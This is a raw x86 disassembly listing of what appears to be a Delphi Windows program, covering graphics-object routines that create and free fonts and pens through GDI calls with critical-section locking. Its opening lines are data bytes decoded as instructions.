imul esp [ ebx - 0x73 ] 0x27140040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
insd
popad
jo r-xdata
add [ eax + 0x64004282 ] dl
or al 0x54
push ebx
push 0x64657261
dec ecx
imul esp [ ebx - 0x68 ] 0x1c004226
pop esi
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ edx ] 0x30
popad
inc edx
add [ eax ] bh
test [ edx ] al
mov [ edx + eax * 2 + 0x426fac00 ] es
add [ eax + 0x42 ] cl
add ah dl
pushad
inc edx
add [ eax + 0x79 ] dh
inc edx
add [ edi + eax * 4 + 0x42 ] cl
add ah ch
js r-xdata
add [ edx ] 0x64
sub [ edx ] al
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] ch
inc edx
add [ eax ] bl
add [ eax ] al
add [ edi ] dh
inc edx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
hlt
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42284070
add [ eax ] dl
daa
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ edi + eax * 4 + 0x42 ] dl
add [ ebp + esi * 2 + 0x761c0042 ] bh
inc edx
add [ eax - 0x7f ] bl
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4228bc70
add [ edi ] al
insd
popad
lea eax [ bx + si ]
loopne r-xdata
jo r-xdata
popad
nop
test [ ecx ] ch
inc edx
add [ eax ] al
jo r-xdata
add ah dl
xor al 0x40
add al cl
xor al 0x40
imul esp [ ebx + 0x73 ] 0x80900000
daa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x80042 ] al
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x34426b86
add [ eax ] al
add [ esi + 0x42 ] cl
add al al
xor al 0x40
add [ eax - 0x2fffbe76 ] dh
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
nop
mov [ edx ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
sub [ ecx ] ch
inc edx
add [ eax ] al
sub_422985
mov [ ecx ] eax
mov al 0x5e
inc edx
add al al
mov [ edx ] al
inc eax
mov eax [ ecx ]
inc eax
pop esi
inc edx
add [ eax ] ah
mov [ edx ] eax
cld
pop esi
inc edx
add [ eax - 0x77 ] ah
inc edx
add [ ecx + ecx * 4 + 0x60440042 ] cl
inc edx
add [ eax + 0x60 ] cl
inc edx
add [ eax - 0x37ffbd77 ] ah
pushad
inc edx
add [ esp + ecx * 4 ] ah
inc edx
add [ ecx ] ch
inc edx
add [ esp + ecx * 4 ] bh
inc edx
add [ eax - 0x74 ] al
inc edx
add [ eax + 0x61 ] al
inc edx
add [ eax + ecx * 4 ] bh
inc edx
add [ eax + 0x42 ] cl
add ah dl
pushad
inc edx
add al ah
mov al [ edx ]
pop eax
mov [ edx ] es
or [ edx + eax * 2 + 0x428c9400 ] 0x0
add eax 0x6f634954
outsb
mov eax eax
hlt
sub_422a26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] dh
inc edx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
aam 0x2a
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
aaa
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422a98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_422ad4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_422b10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422a84
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422af8
xor edx edx
push ebp
push sub_422be4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422beb
mov eax [ ebp - 0x4 ]
call sub_422b04
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407df0
test al al
je r-xdata
sub_422bf4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422af8
xor ecx ecx
push ebp
push sub_422c7b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422b04
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422ca4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422af8
xor eax eax
push ebp
push sub_422d0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422b10
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d14
mov eax [ ebp - 0x4 ]
call sub_422b04
retn
mov eax ebx
mov si 0xfffd
call sub_40348c
sub_422d1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422af8
xor eax eax
push ebp
push sub_422d78
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d7f
mov eax [ ebp - 0x4 ]
call sub_422b04
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40348c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422bf4
sub_422d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422af8
xor edx edx
push ebp
push sub_422de7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422dee
mov eax [ ebp - 0x4 ]
call sub_422b04
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_422df4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4186d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422e91
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418310
mov ebx eax
mov eax ebx
call sub_424450
inc [ ebp - 0x4 ]
mov eax ebx
call sub_4248d4
mov eax [ rw-data ]
call sub_422d88
mov eax [ rw-data ]
call sub_422d88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e98
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418738
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418310
call sub_4247ac
inc esi
dec ebx
jne r-xdata
sub_4232f0
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423348
test al al
jne r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_40816c
mov [ esp ] eax
sub_423314
push ebp
mov ebp esp
push ebx
push esi
mov esi 0x34
mov ebx rw-data
mov edx [ ebx ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add ebx 0x8
dec esi
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
sub_42352f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417c34
retn
sub_423560
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402da4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b94
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_423614
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422b10
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_423668
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422bf4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4236ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41890c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_423767
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42336c
xor eax eax
push ebp
push sub_42374a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422d1c
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4237e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423751
mov eax [ ebp - 0x8 ]
call sub_42337c
retn
mov eax ebx
call sub_423a6c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423a88
sub_423798
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_4237dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422ca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237e4
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_4237fc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423985
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42398c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40402c
retn
mov eax [ rw-data ]
call sub_422af8
xor eax eax
push ebp
push sub_42395d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422b04
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40426c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4086d0
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40426c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4086d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40426c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407ec0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_423ae0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_4239a4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423560
mov edx esp
mov eax ebx
call sub_423798
add esp 0x2c
pop esi
pop ebx
retn
sub_4239d0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423780
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423798
add esp 0x2c
pop esi
pop ebx
retn
sub_423a10
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423780
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402ca4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4042a4
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b94
mov edx esp
mov eax ebx
call sub_423798
sub_423a88
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4239d0
pop esi
pop ebx
retn
sub_423ab4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423780
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423798
add esp 0x30
pop ebx
retn
sub_423ae8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423780
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_423798
add esp 0x2c
pop esi
pop ebx
retn
sub_423b18
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423780
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_423798
add esp 0x2c
pop esi
pop ebx
retn
sub_423b40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422b10
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_423b84
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422bf4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_423bac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41890c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_423c4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42336c
xor eax eax
push ebp
push sub_423c2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422d1c
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423d94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c35
mov eax [ ebp - 0x8 ]
call sub_42337c
retn
sub_423c64
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423c7c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_423cc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422ca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423cc8
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_423cd4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423c64
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423c7c
add esp 0x10
pop esi
pop ebx
retn
sub_423cfc
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422af8
xor eax eax
push ebp
push sub_423d82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422b04
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4232e0
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_423db0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423c64
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423c7c
add esp 0x10
pop esi
pop ebx
retn
sub_423de0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423c64
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423c7c
sub_423e0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422b10
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_423e4c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422bf4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_423e74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41890c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_423f04
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42336c
xor eax eax
push ebp
push sub_423ee7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422d1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423eee
mov eax [ ebp - 0x8 ]
call sub_42337c
retn
sub_423f1c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_423f38
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42336c
xor eax eax
push ebp
push sub_423f7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422ca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f84
mov eax [ ebp - 0x4 ]
call sub_42337c
retn
sub_423f88
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_423f38
add esp 0x10
pop edi
pop esi
retn
sub_423fb4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423f1c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_423f38
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_423fe8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422af8
xor edx edx
push ebp
push sub_4240b5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
